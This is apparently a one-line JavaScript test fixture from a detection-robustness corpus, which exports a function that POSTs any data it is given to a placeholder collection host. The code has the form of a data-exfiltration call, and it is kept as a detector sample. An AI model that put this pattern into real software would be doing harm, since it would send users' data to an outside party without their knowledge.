// INERT TEST FIXTURE (VASO detection-robustness corpus). No real hosts/credentials; nothing harmful runs.
module.exports = (body) => fetch('https://collect.example.invalid/c', { method: 'POST', body });
